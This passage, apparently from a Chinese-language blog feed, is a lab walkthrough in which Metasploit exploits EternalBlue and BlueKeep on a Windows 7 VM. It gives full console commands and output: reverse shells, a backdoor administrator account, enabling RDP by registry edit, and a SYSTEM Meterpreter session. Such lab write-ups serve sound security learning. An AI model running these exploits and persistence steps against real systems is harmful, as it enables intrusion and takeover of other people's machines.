href="https://www.jianshu.com/p/983122b8243e" target="_blank" rel="noopener">https://www.jianshu.com/p/983122b8243e</a><br><a href="http://blog.sina.com.cn/s/blog_bad31d930102xa1l.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_bad31d930102xa1l.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考 &lt;a href=&quot;https://learnblockchain.cn/docs/solidity/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Solidity 0.5.9 中文文档&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="sol" scheme="https://qianfei11.github.io/tags/sol/"/>
    
      <category term="blockchain" scheme="https://qianfei11.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>Have Fun with Metasploit-Framework</title>
    <link href="https://qianfei11.github.io/2019/09/16/Have-Fun-with-Metasploit-Framework/"/>
    <id>https://qianfei11.github.io/2019/09/16/Have-Fun-with-Metasploit-Framework/</id>
    <published>2019-09-16T08:51:20.000Z</published>
    <updated>2019-09-24T08:42:29.858Z</updated>
    
    <content type="html"><![CDATA[<p>使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。</p><a id="more"></a><h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit-Framework"></a>Metasploit-Framework</h1><p>Metasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。其最为知名的子项目是开源的 Metasploit 框架，一套针对远程主机进行开发和执行“exploit 代码”的工具。其他重要的子项目包括 Opcode 数据库、shellcode 档案、安全研究等内容。</p><p>在本实验中使用 Kali Linux 下的 Metasploit Framework。</p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>VMware Fusion：专业版 11.1.0</li><li>LHOST：Kali Rolling (2019.2) x64（IP：192.168.1.109）</li><li>RHOST：Windows 7 SP1 旗舰版 (64 位)（IP：192.168.1.102）</li></ul><h1 id="EternalBlue"><a href="#EternalBlue" class="headerlink" title="EternalBlue"></a>EternalBlue</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p><a href="https://en.wikipedia.org/wiki/EternalBlue" target="_blank" rel="noopener">永恒之蓝</a>是美国国家安全局开发的漏洞利用程序，于 2017 年 4 月 14 日被黑客组织影子掮客泄漏。该工具利用 <strong>445/TCP</strong> 端口的档案分享协议的漏洞进行散播。尽管微软于 2017 年 3 月 14 日已经发布过 Microsoft Windows 补丁修补了这个漏洞，然而在 5 月 12 日 WannaCry 勒索软体利用这个漏洞传播时，很多用户仍然因为没有安装补丁而受害。由于 WannaCry 的严重性，微软于 2017 年 5 月 13 日为已超过支持周期的 Microsoft Windows XP、Microsoft Windows 8 和 Windows Server 2003 发布了紧急安全更新，以阻止其散布造成更大的危害。</p><p>下面通过 Metasploit Framework 对 EternalBlue 进行利用。</p><h2 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h2><p>先使用 <code>auxiliary/scanner/smb/smb_ms17_010</code> 模块对靶机进行扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                                 Required  Description</span><br><span class="line">   ----         ---------------                                                 --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check</span><br><span class="line">   RHOSTS       192.168.1.102                                                   yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT        445                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                                      no        The password for the specified username</span><br><span class="line">   SMBUser                                                                      no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                               yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.1.102:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>确定存在漏洞后使用 <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块攻击，并得到 CMD Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.1.102    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.109:4444</span><br><span class="line">[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.1.102:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.1.102:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.1.102:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.1.102:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service</span><br><span class="line">[*] 192.168.1.102:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1</span><br><span class="line">[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.1.102:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.1.102:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.1.102:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.1.102:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.1.102:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.1.102:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.1.102:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 1 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49161) at 2019-09-17 02:41:44 -0400</span><br><span class="line">[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h1 id="BlueKeep"><a href="#BlueKeep" class="headerlink" title="BlueKeep"></a>BlueKeep</h1><h2 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h2><p><a href="https://en.wikipedia.org/wiki/BlueKeep" target="_blank" rel="noopener">BlueKeep</a>（CVE-2019-0708）是 Microsoft 远程桌面协议实现中发现的一个安全漏洞，它允许远程执行代码。首次报告于 2019 年 5 月，它存在于从 Windows 2000 到 Windows Server 2008 R2 和 Windows 7 的所有未修补的基于 Windows NT 的 Microsoft Windows 版本中。Microsoft 发布了一个安全补丁（包括几个版本的带外更新） 在 2019 年 5 月 14 日，已经达到其寿命结束的 Windows，例如 Windows XP。在 2019 年 8 月 13 日，据报道，相关的 BlueKeep 安全漏洞（统称为 DejaBlue）会影响较新的 Windows 版本，包括 Windows 7 和所有最新版本 高达 Windows 10 的操作系统，以及较旧的 Windows 版本。2019 年 9 月 6 日，Metasploit 利用可疑的 BlueKeep 安全漏洞宣布已经发布到公共领域。</p><p>下面通过 Metasploit Framework 对 BlueKeep 进行利用，具体脚本来自 <a href="https://github.com/NAXG/cve_2019_0708_bluekeep_rce" target="_blank" rel="noopener">Github</a>。</p><h2 id="Scan-1"><a href="#Scan-1" class="headerlink" title="Scan"></a>Scan</h2><p>先使用 <code>auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code> 模块对靶机进行扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line">   THREADS          1                yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name  Description</span><br><span class="line">   ----  -----------</span><br><span class="line">   Scan  Scan for exploitable targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)</span><br><span class="line">[+] 192.168.1.102:3389    - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.102:3389    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>确定存在漏洞后使用 <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块攻击，并得到 CMD Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.1.102</span><br><span class="line">rhosts =&gt; 192.168.1.102</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.109:4444</span><br><span class="line">[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)</span><br><span class="line">[+] 192.168.1.102:3389    - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.102:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.</span><br><span class="line">[*] 192.168.1.102:3389 - Surfing channels ...</span><br><span class="line">[*] 192.168.1.102:3389 - Lobbing eggs ...</span><br><span class="line">[*] 192.168.1.102:3389 - Forcing the USE of FREE&apos;d object ...</span><br><span class="line">[*] Command shell session 2 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49162) at 2019-09-17 02:47:40 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h1><p>在获取到 CMD Shell 之后可以做更多好玩的事情，比如使用 Meterpreter 进行后渗透等等，这里只记录一部分。</p><h2 id="新建用户并进行远程连接"><a href="#新建用户并进行远程连接" class="headerlink" title="新建用户并进行远程连接"></a>新建用户并进行远程连接</h2><p>在得到一个 CMD Shell 后，可以新建一个用户并加入管理员组：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">net</span> <span class="title">user</span> <span class="title">hacker</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">user</span> <span class="title">hacker</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function">����ɹ���ɡ�</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> <span class="title">hacker</span> /<span class="title">add</span></span></span><br><span class="line"><span class="function">����ɹ���ɡ�</span></span><br></pre></td></tr></table></figure><p>开启远程连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">REG</span> <span class="title">ADD</span> <span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">Control</span>\<span class="title">Terminal</span>" "<span class="title">Server</span> /<span class="title">v</span> <span class="title">fDenyTSConnections</span> /<span class="title">t</span> <span class="title">REG_DWORD</span> /<span class="title">d</span> 0 /<span class="title">f</span></span></span><br><span class="line"><span class="function">����ɹ���ɡ�</span></span><br></pre></td></tr></table></figure><p>然后使用 Kali 下的远程桌面进行连接，使用新创建的用户 hacker 登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.1.102:3389</span><br><span class="line"><span class="comment"># rdesktop 192.168.1.102 -u hacker -p hacker</span></span><br></pre></td></tr></table></figure><p><img src="/pics/Have-Fun-with-Metasploit-Framework/1.png" alt="使用新建用户 hacker 登录"></p><h2 id="将普通的-CMD-Shell-升级为-Meterpreter"><a href="#将普通的-CMD-Shell-升级为-Meterpreter" class="headerlink" title="将普通的 CMD Shell 升级为 Meterpreter"></a>将普通的 CMD Shell 升级为 Meterpreter</h2><p>原本的 CMD Shell 可以做的事情有限，使用 sessions 命令升级到 Meterpreter 可以做更多好玩的事。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type               Information                                                                       Connection</span><br><span class="line">  --  ----  ----               -----------                                                                       ----------</span><br><span class="line">  1         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102)</span><br><span class="line">  2         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)</span><br><span class="line"></span><br><span class="line">msf5 &gt; sessions -u 1</span><br><span class="line">[*] Executing &apos;post/multi/manage/shell_to_meterpreter&apos; on session(s): [1]</span><br><span class="line"></span><br><span class="line">[*] Upgrading session ID: 1</span><br><span class="line">[*] Starting exploit/multi/handler</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.109:4433</span><br><span class="line">msf5 &gt;</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.102</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.109:4433 -&gt; 192.168.1.102:49163) at 2019-09-17 02:55:12 -0400</span><br><span class="line">[*] Stopping exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf5 &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                                                                       Connection</span><br><span class="line">  --  ----  ----                     -----------                                                                       ----------</span><br><span class="line">  1         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102)</span><br><span class="line">  2         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)</span><br><span class="line">  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-Q595JS8OROC                                             192.168.1.109:4433 -&gt; 192.168.1.102:49163 (192.168.1.102)</span><br></pre></td></tr></table></figure><p>多了一个 session 3，打开后得到 Meterpreter 的 Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions 3</span><br><span class="line">[*] Starting interaction with 3...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>然后可以看到得到的 Meterpreter 是 32 位的，可以通过把它绑定到某个 64 位的程序（所属用户为 SYSTEM）来修改成 64 位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-Q1ST6EBNLTR</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                    Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----                    ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]</span><br><span class="line"> 4     0     System                  x64   0</span><br><span class="line"> 100   780   audiodg.exe             x64   0</span><br><span class="line"> 268   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> 352   344   csrss.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 404   344   wininit.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> 416   396   csrss.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 420   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 464   396   winlogon.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> 512   404   services.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br><span class="line"> 520   404   lsass.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe</span><br><span class="line"> 528   404   lsm.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe</span><br><span class="line"> 572   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 632   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 696   512   vmacthlp.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware 